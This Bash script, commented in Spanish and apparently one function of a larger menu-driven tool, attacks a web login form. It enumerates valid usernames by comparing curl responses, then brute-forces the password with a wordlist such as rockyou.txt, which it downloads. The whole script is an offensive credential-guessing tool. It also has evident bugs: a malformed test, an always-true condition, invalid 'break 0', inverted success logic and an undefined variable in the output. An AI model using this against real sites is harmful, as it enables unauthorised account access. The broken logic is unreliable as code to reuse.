#!/bin/bash
diccionario() {
start=1
URL=$(echo -e "$url")
document=a.txt
echo "Dime un usuario o un fichero txt con un listado de usuarios, deja en blanco para la demo.\n"
read document
#Comprobamos que el usuario haya contestado y sino le asignamos el valor que se usa en la demo
if [[ -z $document ]]
then
    document=a.txt
fi
ok=0
vale=0
#Una vez declarados todos los valores y preparado todo, empezamos comprobando el listado de usuarios o nombre de usuario designado, en caso de que sea un listado se hace lo siguiente. 
if [[ -f  $document ]]
then
    echo "Recuerda que este proceso puede tardar minutos.\n"
    total=$(wc -l < $document)
    #por tantas lineas de documento ejecutamos un script que haga que compruebe si la url de error es diferente en cada caso
    while [[ $start -le $total ]]
        do
        test=$(awk "NR==$start{print $1}" $document)
        if [[ $(curl -s -d "username=$test&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
        then
            username=$test
            vale=1
            break 0
        fi
        #si la url de error es diferente, significa que hemos encontrado el nombre de usuario.
        ((start = start + 1))
    done
else
#si nos han pasado un solo nombre de usuario en vez de una variable se hace la misma comprobacion sin el bucle
    if [[! $(curl -s -d "username=$document&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
        then
            username=$document
            vale=1
            break 0
        else
            echo "Usuario inexistente.\n"
            'volvermenu'
        fi
fi
#si da error  cerramos el programa
if [[ $vale!=1 ]]
then
    echo -e "No hemos podido encontrar un usuario valido.\n"
    'volvermenu'
fi
#Solicitamos que el usuario nos pase un diccioanrio de contraseñas que puede haber generado con Jhon the ripper o sino podemos utilizar el de demos o el rockyou
echo "Quieres utilizar un diccionario de contraseñas en especifico? Indica la ruta del fichero de ser así, si no omite la respuesta.\n"
read document
if [[ -f  $document ]] 
then
    echo "Fichero valido.\n"
else
    echo "El Fichero no es valido, usaremos un diccionario propio.\n"
#Si ha dejado en blanco el campo usaremos rockyou o la demo
    if [[ -z $document ]]
    then
        echo "Quieres utilizar rockyou? Si quieres usar la demo omite la respuesta.\n"
        read document
        if [[ -z $document ]]
        then
            wget -q "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
            document=rockyou.txt
        else
            document=b.txt
        fi
    fi
fi
start=1
total=$(wc -l < $document)
#ahora que disponemos de un documento de contraseñas utilizamos el usuario previamente encontrado y ejecutamos el test de contraseñas buscando que la respuesta del servidor sea una redirección.
while [[ $start -le $total ]]
    do
    test=$(awk "NR==$start{print $1}" $document)
    if ! [[ $(curl -i -s -d "username=$username&password=$test" $URL | grep -e "302 Found") ]]
    then
        password=$test
        ok=1
        break 0
    fi
    ((start = start + 1))
done
#si hemos descargado anteriormente rockyou.txt, lo borramos
if [[ -f  rockyou.txt ]]
then
    rm rockyou.txt
fi
#ahora muestra los resultados por pantalla
if [[ $ok==1 ]]
then
    echo -e "El usuario es $usuari y su contraseña és $password ."
    'volvermenu'
else
    echo -e "El usuario es $usuari ."
    echo -e "La contraseña no se encuentra en el diccionario, lo sentimos."
    'volvermenu'
fi
}
